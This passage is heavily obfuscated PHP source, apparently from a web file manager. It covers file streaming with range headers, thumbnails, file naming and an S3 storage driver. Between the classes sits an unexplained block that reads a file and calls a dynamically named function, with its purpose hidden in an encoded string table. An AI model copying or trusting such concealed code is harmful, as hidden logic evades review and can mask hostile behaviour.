$ıîœ¨‘³); } $È¸’éÂ± = $—¸…¸çß[121] . $È¸’éÂ± . $—¸…¸çß[121]; $Ä„ÁºìÒ = get_file_mime($õé¯ç¯Û); $ÔËîˆ³ = !0; $ÔËîˆ³ = isset($_GET[$—¸…¸çß[122]]) ? !1 : !0; if ($®…Ô€ÑÛ === !1 && !mime_support($Ä„ÁºìÒ)) { $Ä„ÁºìÒ = $—¸…¸çß[123]; } header($—¸…¸çß[124]); header($—¸…¸çß[125] . $Ä„ÁºìÒ); $Ì†Ôñî¥ = rawurlencode($ï“¡ÛúŠ); $Ì†Ôñî¥ = $—¸…¸çß[121] . $Ì†Ôñî¥ . $—¸…¸çß[126] . $Ì†Ôñî¥; if ($®…Ô€ÑÛ) { header($—¸…¸çß[127]); header($—¸…¸çß[128] . $Ì†Ôñî¥); } else { if ($ÔËîˆ³) { header($—¸…¸çß[129] . $Ì†Ôñî¥); } } $î‚¬©– = 3600 * 24 * 30; header($—¸…¸çß[130]); header($—¸…¸çß[131]); header($—¸…¸çß[132] . $î‚¬©–); header($—¸…¸çß[133] . gmdate($—¸…¸çß[113], time() + $î‚¬©–) . $—¸…¸çß[134]); if (isset($_SERVER[$—¸…¸çß[135]]) && strtotime($_SERVER[$—¸…¸çß[135]]) == $¦‡ş“÷¤[$—¸…¸çß[88]]) { header($—¸…¸çß[136], !0, 304); die; } if (isset($_SERVER[$—¸…¸çß[137]]) && $_SERVER[$—¸…¸çß[137]] == $È¸’éÂ±) { header($—¸…¸çß[138] . $È¸’éÂ±, !0, 304); die; } header($—¸…¸çß[138] . $È¸’éÂ±); header($—¸…¸çß[139] . $àÈÚ‚’» . $—¸…¸çß[134]); header($—¸…¸çß[140] . $ï“¡ÛúŠ); header($—¸…¸çß[141]); header($—¸…¸çß[142] . $ıîœ¨‘³); header($—¸…¸çß[143]); Hook::trigger($—¸…¸çß[144], $¸üê»®‰, $ıîœ¨‘³, $ï“¡ÛúŠ, $õé¯ç¯Û); if (!$®…Ô€ÑÛ && $õé¯ç¯Û == $—¸…¸çß[145]) { if ($ıîœ¨‘³ > 1024 * 1024 * 5) { die; } $Î÷”ÖÖ = $this->getContent($¸üê»®‰); $Î÷”ÖÖ = Html::clearSVG($Î÷”ÖÖ); header($—¸…¸çß[146] . strlen($Î÷”ÖÖ)); echo $Î÷”ÖÖ; die; } $ïºãÒÒ = strtolower($_SERVER[$—¸…¸çß[147]]); if ($€êìƒŞ && $ïºãÒÒ && $ñµÙòßï) { if (strstr($ïºãÒÒ, $—¸…¸çß[148])) { header($—¸…¸çß[149] . $¸üê»®‰); } else { if (strstr($ïºãÒÒ, $—¸…¸çß[150])) { header($—¸…¸çß[151] . $¸üê»®‰); } else { if (strstr($ïºãÒÒ, $—¸…¸çß[152])) { header($—¸…¸çß[153] . $¸üê»®‰); } } } if ($ñÂàêÚ¥) { header($—¸…¸çß[154] . $ñÂàêÚ¥); } return; } if (isset($_SERVER[$—¸…¸çß[155]])) { if (preg_match($—¸…¸çß[156], $_SERVER[$—¸…¸çß[155]], $Àã¯ƒÓë)) { $æŒ†ÁçÉ = intval($Àã¯ƒÓë[1]); $æŒ†ÁçÉ = $æŒ†ÁçÉ <= 0 ? 0 : ($æŒ†ÁçÉ >= $œ™ï˜É ? $œ™ï˜É : $æŒ†ÁçÉ); if (!empty($Àã¯ƒÓë[2])) { $ô°µ™›Á = intval($Àã¯ƒÓë[2]); $œ™ï˜É = $ô°µ™›Á < $æŒ†ÁçÉ ? $æŒ†ÁçÉ : ($ô°µ™›Á >= $œ™ï˜É ? $œ™ï˜É : $ô°µ™›Á); } } header($—¸…¸çß[157]); header("\103\157\156\x74\145\x6e\x74\55\122\x61\x6e\x67\145\72\40\x62\x79\164\145\x73\x20{$æŒ†ÁçÉ}\x2d{$œ™ï˜É}\57" . $ıîœ¨‘³); } else { header($—¸…¸çß[158]); } header($—¸…¸çß[159]); header($—¸…¸çß[160]); $™½¥ñ¹¬ = !0; if ($_SERVER[$—¸…¸çß[161]] == $—¸…¸çß[162] && $ıîœ¨‘³ > 1204 * 1024 * 1024 * 2) { $™½¥ñ¹¬ = !1; } if ($™½¥ñ¹¬) { header($—¸…¸çß[163] . ($œ™ï˜É - $æŒ†ÁçÉ + 1)); } if ($_SERVER[$—¸…¸çß[164]] == $—¸…¸çß[165]) { return; } $Á‘ù¾ÄÉ = array($—¸…¸çß[166] => !1, $—¸…¸çß[167] => $æŒ†ÁçÉ, $—¸…¸çß[168] => $œ™ï˜É, $—¸…¸çß[169] => $õé¯ç¯Û, $—¸…¸çß[170] => $¦‡ş“÷¤, $—¸…¸çß[171] => $—¸…¸çß[12], $—¸…¸çß[172] => 0); $Á‘ù¾ÄÉ = Hook::filter($—¸…¸çß[173], $Á‘ù¾ÄÉ); $¦ò•äİ± = 1024 * 300; $ÌÁòˆ”› = 0; if ($ñÂàêÚ¥) { $ÌÁòˆ”› = intval(1000 * 1000 * ($¦ò•äİ± / $ñÂàêÚ¥)); } while ($æŒ†ÁçÉ <= $œ™ï˜É) { $¾ØÊ¹Ö = timeFloat(); check_abort(); $çò¹ëšÂ = $œ™ï˜É - $æŒ†ÁçÉ + 1; if ($çò¹ëšÂ <= $¦ò•äİ±) { $¦ò•äİ± = $çò¹ëšÂ; } $Î÷”ÖÖ = $this->fileSubstr($¸üê»®‰, $æŒ†ÁçÉ, $¦ò•äİ±); if ($Á‘ù¾ÄÉ[$—¸…¸çß[166]]) { $Á‘ù¾ÄÉ[$—¸…¸çß[171]] = $Î÷”ÖÖ; $Á‘ù¾ÄÉ[$—¸…¸çß[172]] = $æŒ†ÁçÉ; $Á‘ù¾ÄÉ = Hook::filter($—¸…¸çß[174], $Á‘ù¾ÄÉ); $Î÷”ÖÖ = $Á‘ù¾ÄÉ[$—¸…¸çß[171]]; } echo $Î÷”ÖÖ; $æŒ†ÁçÉ += $¦ò•äİ±; if ($¦ò•äİ± == $çò¹ëšÂ) { $æŒ†ÁçÉ = $œ™ï˜É + 1; } if ($ÌÁòˆ”›) { $Ñ…ê‘ñ = intval(1000 * 1000 * (timeFloat() - $¾ØÊ¹Ö)); $í°ë…ƒ = $ÌÁòˆ”› - $Ñ…ê‘ñ; if ($í°ë…ƒ > 5) { usleep($í°ë…ƒ); } } } } public function fileOutServer($À¿Ûñî‚, $ŸöŞÎ½ë = false, $Êœ•ìè« = false, $¿ªÛÅ£¥ = '') { $this->fileOut($À¿Ûñî‚, $ŸöŞÎ½ë, $Êœ•ìè«, $¿ªÛÅ£¥); } public function fileOutLink($€‡ã½ ö) { header($_SERVER[±³—úê][175] . $€‡ã½ ö); die; } public function cacheMethod($±òâÊğ, $‰ÃÔ²ÑÊ, $ùŠãàø• = null) { $„¢ğè¥È =& $_SERVER[±³—úê]; static $ìŒñ°“­ = array(); $ÍÌù†ˆ = $‰ÃÔ²ÑÊ ? ltrim($this->getPathOuter($‰ÃÔ²ÑÊ), $„¢ğè¥È[8]) : $„¢ğè¥È[12]; $à¤ÖÔáÁ = $„¢ğè¥È[176] . $±òâÊğ . $„¢ğè¥È[177] . rtrim($ÍÌù†ˆ, $„¢ğè¥È[8]); if (is_null($±òâÊğ)) { $ìŒñ°“­ = array(); return; } if (is_null($‰ÃÔ²ÑÊ)) { foreach ($ìŒñ°“­ as $à¤ÖÔáÁ => $»„Èñ”ú) { if (!strstr($à¤ÖÔáÁ, $„¢ğè¥È[176] . $±òâÊğ . $„¢ğè¥È[178])) { continue; } unset($ìŒñ°“­[$à¤ÖÔáÁ]); } return; } if (!is_null($ùŠãàø•)) { $ìŒñ°“­[$à¤ÖÔáÁ] = $ùŠãàø•; return; } $×õõ‰Äù = isset($ìŒñ°“­[$à¤ÖÔáÁ]) ? $ìŒñ°“­[$à¤ÖÔáÁ] : null; if (!is_null($×õõ‰Äù)) { return $×õõ‰Äù; } $×õõ‰Äù = $this->{$±òâÊğ}($‰ÃÔ²ÑÊ); $ìŒñ°“­[$à¤ÖÔáÁ] = $×õõ‰Äù; return $×õõ‰Äù; } public function cacheMethodInfoSet($¦®…å±ª, $®Î±ã˜º, $úû‡»—÷ = false) { $ Ü¡å¯» =& $_SERVER[±³—úê]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ Ü¡å¯»[179], $¦®…å±ª, $®Î±ã˜º); $this->cacheMethod($ Ü¡å¯»[180], $¦®…å±ª, $®Î±ã˜º ? !1 : !0); if (is_array($úû‡»—÷)) { $this->cacheMethod($ Ü¡å¯»[181], $¦®…å±ª, $úû‡»—÷); } } public function fileOutImage($ä§Âğ˜î, $×¾Âú¯ß = 250) { $Ø‚ÏÕ =& $_SERVER[±³—úê]; set_timeout(); if (substr($ä§Âğ˜î, 0, 4) == $Ø‚ÏÕ[152]) { $this->fileOutLink($ä§Âğ˜î); } $°¼§®ú = $this->info($ä§Âğ˜î); $ÙÀ¶ˆŒ = !1; $ôß˜ã– = isset($GLOBALS[$Ø‚ÏÕ[182]]) ? $GLOBALS[$Ø‚ÏÕ[182]] : array(); if ($ôß˜ã– && $ôß˜ã–[$Ø‚ÏÕ[183]] == $°¼§®ú[$Ø‚ÏÕ[87]]) { $°¼§®ú = $ôß˜ã–; $€²ã¹ = $°¼§®ú[$Ø‚ÏÕ[184]]; if ($€²ã¹ && isset($€²ã¹[$Ø‚ÏÕ[185]])) { if ($€²ã¹[$Ø‚ÏÕ[185]] <= $×¾Âú¯ß && $€²ã¹[$Ø‚ÏÕ[186]] <= $×¾Âú¯ß) { $ÙÀ¶ˆŒ = !0; } } } if ($°¼§®ú[$Ø‚ÏÕ[79]] <= 1024 * 50 || $ÙÀ¶ˆŒ || !function_exists($Ø‚ÏÕ[187]) || $°¼§®ú[$Ø‚ÏÕ[169]] == $Ø‚ÏÕ[188]) { return $this->fileOut($ä§Âğ˜î, !1, $°¼§®ú[$Ø‚ÏÕ[32]]); } $®·´øç = kodIO::hashPath($°¼§®ú); $À°óü±Â = "\x63\157\x76\145\162\x5f{$®·´øç}\137{$×¾Âú¯ß}\56\x70\x6e\x67"; $Şì¼õ¢ü = IO_PATH_SYSTEM_TEMP . $Ø‚ÏÕ[189]; $ÜÚü²ËÓ = IO::infoFullSimple($Şì¼õ¢ü); $­æĞèÄ = $ÜÚü²ËÓ && is_array($ÜÚü²ËÓ) ? $ÜÚü²ËÓ[$Ø‚ÏÕ[87]] : $Ø‚ÏÕ[12]; if (!$­æĞèÄ) { $­æĞèÄ = IO::mkdir($Şì¼õ¢ü); } if ($°¼§®ú[$Ø‚ÏÕ[190]] == $Ø‚ÏÕ[191] && isset($°¼§®ú[$Ø‚ÏÕ[192]]) && $°¼§®ú[$Ø‚ÏÕ[192]] == kodIO::sourceID($­æĞèÄ)) { $Ô×èã”Ú = $°¼§®ú[$Ø‚ÏÕ[193]]; if ($×¾Âú¯ß <= 500) { $ª¯Ø‹ò« = preg_replace($Ø‚ÏÕ[194], $Ø‚ÏÕ[195], $°¼§®ú[$Ø‚ÏÕ[32]]); $Ô×èã”Ú = IO::fileNameExist($­æĞèÄ, $ª¯Ø‹ò«); } return IO::fileOut(KodIO::make($Ô×èã”Ú), !1, $°¼§®ú[$Ø‚ÏÕ[32]]); } $«ì“ìäÍ = IO::fileNameExist($­æĞèÄ, $À°óü±Â); if ($«ì“ìäÍ) { return IO::fileOut(KodIO::make($«ì“ìäÍ), !1, $°¼§®ú[$Ø‚ÏÕ[32]]); } if ($×¾Âú¯ß > 1000) { $this->makeImageCover($­æĞèÄ, $ä§Âğ˜î, $À°óü±Â, $×¾Âú¯ß); $this->makeImageCover($­æĞèÄ, $ä§Âğ˜î, "\143\x6f\x76\x65\x72\x5f{$®·´øç}\137\62\x35\60\x2e\x70\x6e\147", 250); $«ì“ìäÍ = IO::fileNameExist($­æĞèÄ, $À°óü±Â); if ($«ì“ìäÍ) { return IO::fileOut(KodIO::make($«ì“ìäÍ), !1, $°¼§®ú[$Ø‚ÏÕ[32]]); } die; } if (!kodIO::allowCover($°¼§®ú)) { return $this->fileOut($ä§Âğ˜î, !1, $°¼§®ú[$Ø‚ÏÕ[32]]); } $ä¾Ï¯ Ü = Cache::get($À°óü±Â); if ($ä¾Ï¯ Ü == $Ø‚ÏÕ[196] || $ä¾Ï¯ Ü == $Ø‚ÏÕ[197]) { echo $ä¾Ï¯ Ü; die; } Cache::set($À°óü±Â, $Ø‚ÏÕ[197], 60); $•„ƒÁÆÑ = array($­æĞèÄ, $°¼§®ú[$Ø‚ÏÕ[87]], $À°óü±Â, $×¾Âú¯ß); $Ñ˜òÉ…ù = $Ø‚ÏÕ[198] . $°¼§®ú[$Ø‚ÏÕ[79]] . $Ø‚ÏÕ[199] . $À°óü±Â . $Ø‚ÏÕ[200] . $°¼§®ú[$Ø‚ÏÕ[32]] . $Ø‚ÏÕ[201] . $°¼§®ú[$Ø‚ÏÕ[87]]; TaskQueue::add($Ø‚ÏÕ[202], $•„ƒÁÆÑ, $Ñ˜òÉ…ù, $À°óü±Â); } public function makeImageCover($»ëËêÚŒ, $üƒ¦òä, $à…Ü²ŒÌ, $Åû’¹Ş) { $¡ıñèÅ“ =& $_SERVER[±³—úê]; if (IO::fileNameExist($»ëËêÚŒ, $à…Ü²ŒÌ)) { return $¡ıñèÅ“[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $®³‹ˆ‘À = DATA_THUMB . $à…Ü²ŒÌ; del_file($®³‹ˆ‘À); $É’™çê­ = IO::copy($üƒ¦òä, TEMP_FILES, !1, $à…Ü²ŒÌ); if (!@file_exists($É’™çê­)) { return $¡ıñèÅ“[204]; } ImageThumb::createThumb($É’™çê­, $®³‹ˆ‘À, $Åû’¹Ş, $Åû’¹Ş * 10); if (@file_exists($®³‹ˆ‘À)) { Cache::remove($à…Ü²ŒÌ); return IO::move($®³‹ˆ‘À, $»ëËêÚŒ); } Cache::set($à…Ü²ŒÌ, $¡ıñèÅ“[196], 600); del_file($®³‹ˆ‘À); return $¡ıñèÅ“[205] . $É’™çê­ . $¡ıñèÅ“[74]; } public function fileOutImageServer($»‡®ïÚÃ, $ı¿¸ú®Ø = 250) { $this->fileOutImage($»‡®ïÚÃ, $ı¿¸ú®Ø); } public function fileNameAuto($ì“ööµƒ, $½ÓĞÛÒ¾, $ùÇÈ¸¦í = REPEAT_RENAME, $˜Úø€ÆË = false) { $âï’‚°¥ =& $_SERVER[±³—úê]; $Ãú›äÑÚ = $ì“ööµƒ === $âï’‚°¥[12] ? $½ÓĞÛÒ¾ : rtrim($ì“ööµƒ, $âï’‚°¥[8]) . $âï’‚°¥[8] . $½ÓĞÛÒ¾; if ($ùÇÈ¸¦í == REPEAT_REPLACE || !$this->exist($Ãú›äÑÚ) || $˜Úø€ÆË && $ùÇÈ¸¦í != REPEAT_RENAME_FOLDER) { return $½ÓĞÛÒ¾; } if ($ùÇÈ¸¦í == REPEAT_SKIP) { return !1; } $˜êÜÜ§’ = $âï’‚°¥[10] . get_path_ext($½ÓĞÛÒ¾); $˜êÜÜ§’ = $˜êÜÜ§’ == $âï’‚°¥[10] || $˜Úø€ÆË ? $âï’‚°¥[12] : $˜êÜÜ§’; $Î›…Å·ã = 1; $›®ùè‡é = substr($½ÓĞÛÒ¾, 0, strlen($½ÓĞÛÒ¾) - strlen($˜êÜÜ§’)); $êŸ‹¤ºÒ = $›®ùè‡é . "\50{$Î›…Å·ã}\51{$˜êÜÜ§’}"; while ($this->exist(rtrim($ì“ööµƒ, $âï’‚°¥[8]) . $âï’‚°¥[8] . $êŸ‹¤ºÒ)) { $êŸ‹¤ºÒ = $›®ùè‡é . "\x28{$Î›…Å·ã}\51{$˜êÜÜ§’}"; $Î›…Å·ã++; } return $êŸ‹¤ºÒ; } private function fileNameAutoList($ĞğÄÖûÎ, $õü¯Œä©, $ìÕıÇ¾è = false) { $¥µıî‘ =& $_SERVER[±³—úê]; $ƒşüÀ’„ = $this->listPath($ĞğÄÖûÎ, !0); $ƒşüÀ’„ = array_merge($ƒşüÀ’„[$¥µıî‘[85]], $ƒşüÀ’„[$¥µıî‘[86]]); $°Ğæ÷ı’ = array_to_keyvalue($ƒşüÀ’„, $¥µıî‘[12], $¥µıî‘[32]); $·µËÀÑ = $¥µıî‘[10] . get_path_ext($õü¯Œä©); $·µËÀÑ = $·µËÀÑ == $¥µıî‘[10] || $ìÕıÇ¾è ? $¥µıî‘[12] : $·µËÀÑ; $ã·¿Õë¹ = substr($õü¯Œä©, 0, strlen($õü¯Œä©) - strlen($·µËÀÑ)); $úƒ¹ƒ¬» = $ã·¿Õë¹ . "\50\x30\x29{$·µËÀÑ}"; for ($ÂÃìÛİ‹ = 1; $ÂÃìÛİ‹ <= count($°Ğæ÷ı’) + 1; $ÂÃìÛİ‹++) { $úƒ¹ƒ¬» = $ã·¿Õë¹ . "\x28{$ÂÃìÛİ‹}\51{$·µËÀÑ}"; if (!in_array_not_case($úƒ¹ƒ¬», $°Ğæ÷ı’)) { return $úƒ¹ƒ¬»; } } return $úƒ¹ƒ¬»; } public function listAllFiles($¾•şœ¯Ú, $æçÆ›Íì) { $¹ê¢Ê‡€ =& $_SERVER[±³—úê]; if (empty($æçÆ›Íì)) { return array(); } $õŒªŒ¢… = array_keys($æçÆ›Íì); $—öÒì÷ = array(); $¾•şœ¯Ú = trim($¾•şœ¯Ú, $¹ê¢Ê‡€[8]); foreach ($æçÆ›Íì as $Ãò›»Šç => $ØÔ‹”—) { $¿ñöÍ·ó = ltrim(substr(trim($Ãò›»Šç, $¹ê¢Ê‡€[8]), strlen($¾•şœ¯Ú)), $¹ê¢Ê‡€[8]); if (substr($Ãò›»Šç, -1) == $¹ê¢Ê‡€[8]) { $¿ñöÍ·ó = rtrim($¿ñöÍ·ó, $¹ê¢Ê‡€[8]) . $¹ê¢Ê‡€[8]; } $—öÒì÷ = array_merge($—öÒì÷, $this->slicePath($¿ñöÍ·ó)); } $Ô½‡’‘Í = array(); foreach (array_unique($—öÒì÷) as $§°¹êÒÔ) { $ÏÇÀ‚¢ = array($¹ê¢Ê‡€[87] => $this->getPathOuter($¹ê¢Ê‡€[8] . $¾•şœ¯Ú . $¹ê¢Ê‡€[8] . $§°¹êÒÔ), $¹ê¢Ê‡€[78] => 1, $¹ê¢Ê‡€[79] => 0); if (substr($§°¹êÒÔ, -1) != $¹ê¢Ê‡€[8]) { $ÏÇÀ‚¢[$¹ê¢Ê‡€[78]] = 0; $Èêö™¶Ú = $this->getPath($¾•şœ¯Ú . $¹ê¢Ê‡€[8] . $§°¹êÒÔ); if (isset($æçÆ›Íì[$Èêö™¶Ú])) { $ïÈ·«ÜË = $æçÆ›Íì[$Èêö™¶Ú]; if (isset($ïÈ·«ÜË[$¹ê¢Ê‡€[79]])) { $ÏÇÀ‚¢[$¹ê¢Ê‡€[79]] = intval($ïÈ·«ÜË[$¹ê¢Ê‡€[79]]); } if (isset($ïÈ·«ÜË[$¹ê¢Ê‡€[206]])) { $ÏÇÀ‚¢[$¹ê¢Ê‡€[88]] = intval($ïÈ·«ÜË[$¹ê¢Ê‡€[206]]); } } } $Ô½‡’‘Í[] = $ÏÇÀ‚¢; } return $Ô½‡’‘Í; } public function slicePath($¨­©ÉË) { $èóš÷Ê =& $_SERVER[±³—úê]; $ÊÆ¨Ù•Ü = explode($èóš÷Ê[8], trim($¨­©ÉË, $èóš÷Ê[8])); $½…ßô¦« = 0; do { ++$½…ßô¦«; $–â²ù£€[] = implode($èóš÷Ê[8], array_slice($ÊÆ¨Ù•Ü, 0, $½…ßô¦«)) . $èóš÷Ê[8]; } while ($½…ßô¦« < count($ÊÆ¨Ù•Ü)); $–â²ù£€[count($ÊÆ¨Ù•Ü) - 1] = $¨­©ÉË; return $–â²ù£€; } public function getHost() { $¦Çğ¬÷§ =& $_SERVER[±³—úê]; $“Ñ…Êô» = parse_url(trim($this->domain, $¦Çğ¬÷§[8])); $¹ç»Ï– = isset($“Ñ…Êô»[$¦Çğ¬÷§[207]]) ? $“Ñ…Êô»[$¦Çğ¬÷§[207]] : http_type(); $ã½ìªá = isset($“Ñ…Êô»[$¦Çğ¬÷§[208]]) ? $“Ñ…Êô»[$¦Çğ¬÷§[208]] : $“Ñ…Êô»[$¦Çğ¬÷§[87]]; if (isset($“Ñ…Êô»[$¦Çğ¬÷§[209]])) { $ã½ìªá .= $¦Çğ¬÷§[4] . $“Ñ…Êô»[$¦Çğ¬÷§[209]]; } return $¹ç»Ï– . $¦Çğ¬÷§[210] . $ã½ìªá; } public function pathEncode($¦îç³¢û) { $¢Ô‘‚´ =& $_SERVER[±³—úê]; return str_replace($¢Ô‘‚´[211], $¢Ô‘‚´[8], rawurlencode($¦îç³¢û)); } public function writeLog($Ñ»¼Æ†¨ = '', $½ÅÜâ¼Ô = false) { $ıÚ ü¨Ù =& $_SERVER[±³—úê]; $ô´Ÿ¯µ½ = in_array(ACTION, array($ıÚ ü¨Ù[212], $ıÚ ü¨Ù[213])); if (!$ô´Ÿ¯µ½ && !GLOBAL_DEBUG) { return; } $ê€Íıû¬ = $Ñ»¼Æ†¨; static $„ü¸»¦ = null; if (!$„ü¸»¦) { $„ü¸»¦ = strtoupper($this->getType()); } $Ñ»¼Æ†¨ = $„ü¸»¦ . $ıÚ ü¨Ù[214] . $Ñ»¼Æ†¨; if ($½ÅÜâ¼Ô) { $°ºú´ø = error_get_last(); if ($°ºú´ø) { $Ñ»¼Æ†¨ = array($Ñ»¼Æ†¨, $°ºú´ø); } } write_log($Ñ»¼Æ†¨, $ıÚ ü¨Ù[215]); if ($ô´Ÿ¯µ½) { throw new Exception($ê€Íıû¬); } } } if ($_SERVER[$_SERVER[±³—úê][216]] != $_SERVER[$_SERVER[±³—úê][217]]) { $_getc = $_SERVER[±³—úê][218]; $_getfile = $_SERVER[$_SERVER[±³—úê][219]] . $_SERVER[±³—úê][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±³—úê][221], $_getfilec); if (count($_getarrs) < $_SERVER[±³—úê][222]) { $exit = $_SERVER[±³—úê][223]; $exit(); } $_act = $_SERVER[±³—úê][224]; $_act($_SERVER[$_SERVER[±³—úê][225]]); } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($­áºÅâˆ) { set_timeout(); require_once SDK_DIR . $_SERVER[±³—úê][226]; parent::__construct(); $this->_init($­áºÅâˆ); } public function _init($ÈÅ®ı–) { $´ÎÀ²‘ø =& $_SERVER[±³—úê]; $this->config = $ÈÅ®ı–; foreach ($ÈÅ®ı– as $‡‹äãÁ => $ĞçğÛğ) { if (isset($this->{$‡‹äãÁ})) { $this->{$‡‹äãÁ} = $ĞçğÛğ; } } $this->endpoint = $ÈÅ®ı–[$´ÎÀ²‘ø[227]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ñÖñÍñ« = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ñÖñÍñ«, 0, 7) == $´ÎÀ²‘ø[228]) { $ñÖñÍñ« = $´ÎÀ²‘ø[229] . substr($ñÖñÍñ«, 7); } $this->client->setEndpoint($ñÖñÍñ«); if (in_array(ACTION, array($´ÎÀ²‘ø[212], $´ÎÀ²‘ø[213]))) { $this->client->setExceptions(); } } public function setSignVersion($İŞ“ÙŞµ = "\x76\64") { $this->signVer = $İŞ“ÙŞµ; $this->client->setSignVersion($İŞ“ÙŞµ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $óüòßî) { return null; } } public function isBucketCors() { $ÜÕÑûÃÜ =& $_SERVER[±³—úê]; $Äúİ“×ğ = $this->getBucketCors(); if (!$Äúİ“×ğ || !is_array($Äúİ“×ğ)) { return !1; } if (!is_array($Äúİ“×ğ[$ÜÕÑûÃÜ[230]])) { $Äúİ“×ğ[$ÜÕÑûÃÜ[230]] = explode($ÜÕÑûÃÜ[50], $Äúİ“×ğ[$ÜÕÑûÃÜ[230]]); } if ($Äúİ“×ğ[$ÜÕÑûÃÜ[231]] != $ÜÕÑûÃÜ[232] || !in_array($ÜÕÑûÃÜ[232], $Äúİ“×ğ[$ÜÕÑûÃÜ[230]])) { return !1; } $İàªÅû£ = array_map($ÜÕÑûÃÜ[233], $Äúİ“×ğ[$ÜÕÑûÃÜ[234]]); if (!is_array($İàªÅû£)) { $İàªÅû£ = array(); } $°¡Ä‚ï = array($ÜÕÑûÃÜ[235], $ÜÕÑûÃÜ[236], $ÜÕÑûÃÜ[237], $ÜÕÑûÃÜ[238], $ÜÕÑûÃÜ[239]); $˜¬¡şËÇ = array_diff($°¡Ä‚ï, $İàªÅû£); return empty($˜¬¡şËÇ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($–§¦‰Ó…, $Ì—îÉËê = '', $¹ã­ôÚ = REPEAT_RENAME) { $ÜÎŞ¯§¬ = $this->setContent($–§¦‰Ó…, $Ì—îÉËê); if ($ÜÎŞ¯§¬ !== !1) { return $this->getPathOuter($–§¦‰Ó…); } return !1; } public function mkdir($”ÒšÛÀ, $Ô‹ûâŠ = REPEAT_SKIP) { $ìôÉ¸·È =& $_SERVER[±³—úê]; if (empty($”ÒšÛÀ) && $”ÒšÛÀ !== $ìôÉ¸·È[240]) { return !1; } if ($Ô‹ûâŠ && $this->_isFolder($”ÒšÛÀ)) { return $this->getPathOuter($”ÒšÛÀ); } $óí©¿ç„ = $this->setContent($”ÒšÛÀ, $ìôÉ¸·È[12], !0); if ($óí©¿ç„ !== !1) { return $this->getPathOuter($”ÒšÛÀ); } return !1; } public function copyFile($í¡ÂÚå, $ŒÎşæñà, $…Æüü×© = array()) { $˜Ö¯Áµ =& $_SERVER[±³—úê]; $®•ÅÃ®ò = $this->objectMeta($í¡ÂÚå); if (!$®•ÅÃ®ò) { return !1; } if ($®•ÅÃ®ò[$˜Ö¯Áµ[79]] <= 1024 * 1024 * 200) { $ÔÑ¹Ä¨ô = $this->client->copyObject($this->bucket, $í¡ÂÚå, $this->bucket, $ŒÎşæñà, $˜Ö¯Áµ[241], $…Æüü×©); } else { $ÔÑ¹Ä¨ô = $this->client->multiCopyObject($this->bucket, $í¡ÂÚå, $this->bucket, $ŒÎşæñà, $…Æüü×©); } $ÔÑ¹Ä¨ô = $ÔÑ¹Ä¨ô ? $this->getPathOuter($ŒÎşæñà) : !1; return $ÔÑ¹Ä¨ô; } public function moveFile($‰×”¹ƒñ, $ÈçéÙÀ­) { if ($this->copyFile($‰×”¹ƒñ, $ÈçéÙÀ­)) { $this->delFile($‰×”¹ƒñ); return $this->getPathOuter($ÈçéÙÀ­); } return !1; } public function delFile($™æô×–¾) { return $this->client->deleteObject($this->bucket, $™æô×–¾); } public function delFolder($Ç£Ğˆ­ñ) { $½ıÙÔ =& $_SERVER[±³—úê]; if (!$this->exist($Ç£Ğˆ­ñ)) { return !0; } $this->listItemCache = !1; $Æ¸ßÔı = $this->fileList($Ç£Ğˆ­ñ); $this->listItemCache = !0; $ù§’èÃ¥ = trim($Ç£Ğˆ­ñ, $½ıÙÔ[8]) . $½ıÙÔ[8]; if (!empty($Ç£Ğˆ­ñ) && $Ç£Ğˆ­ñ !== $½ıÙÔ[240] && !in_array($ù§’èÃ¥, $Æ¸ßÔı[$½ıÙÔ[85]])) { $Æ¸ßÔı[$½ıÙÔ[85]][] = $ù§’èÃ¥; } $àïÆ¿ˆ = $this->delByBatch($Æ¸ßÔı[$½ıÙÔ[86]]); if (!$àïÆ¿ˆ) { return !1; } $àïÆ¿ˆ = $this->delByBatch($Æ¸ßÔı[$½ıÙÔ[85]]); if (!$àïÆ¿ˆ) { return !1; } return $this->delFile($ù§’èÃ¥); } private function delByBatch($”å¦Ş””) { foreach (array_chunk($”å¦Ş””, 1000) as $Â®§ˆÒ¦) { $ûâÊØ¹‹ = $this->client->deleteObjects($this->bucket, $Â®§ˆÒ¦); if (!$ûâÊØ¹‹) { return !1; } } return !0; } public function rename($²Ğı†ô, $›âæ£Ä§) { return $this->renameObject($²Ğı†ô, $›âæ£Ä§); } public function listPath($ÀÉˆ—², $äèƒÛ—í = false) { $ã™‹Êö =& $_SERVER[±³—úê]; $¸İ±şù = $this->fileList($ÀÉˆ—², $ã™‹Êö[8], !0); foreach ($¸İ±şù[$ã™‹Êö[85]] as $•…”ÓÔ© => $Ñ‹Õíç“) { $¸İ±şù[$ã™‹Êö[85]][$•…”ÓÔ©] = $this->folderInfo($Ñ‹Õíç“, $äèƒÛ—í, $Ñ‹Õíç“); } foreach ($¸İ±şù[$ã™‹Êö[86]] as $•…”ÓÔ© => $Ñ‹Õíç“) { $¸İ±şù[$ã™‹Êö[86]][$•…”ÓÔ©] = $this->fileInfo($Ñ‹Õíç“[$ã™‹Êö[32]], $äèƒÛ—í, $Ñ‹Õíç“); } return $¸İ±şù; } protected function infoChildren($­şÈÇûì, &$ÊÓ—ªÊ) { $†ğË§î± =& $_SERVER[±³—úê]; $ê»İ³¤Æ = $this->fileList($­şÈÇûì, $†ğË§î±[12], !0); $ÊÓ—ªÊ[$†ğË§î±[81]] += count($ê»İ³¤Æ[$†ğË§î±[85]]); $ÊÓ—ªÊ[$†ğË§î±[80]] += count($ê»İ³¤Æ[$†ğË§î±[86]]); foreach ($ê»İ³¤Æ[$†ğË§î±[86]] as $ôÌˆŒÂ¨) { if (!$ôÌˆŒÂ¨ || !$ôÌˆŒÂ¨[$†ğË§î±[79]]) { continue; } 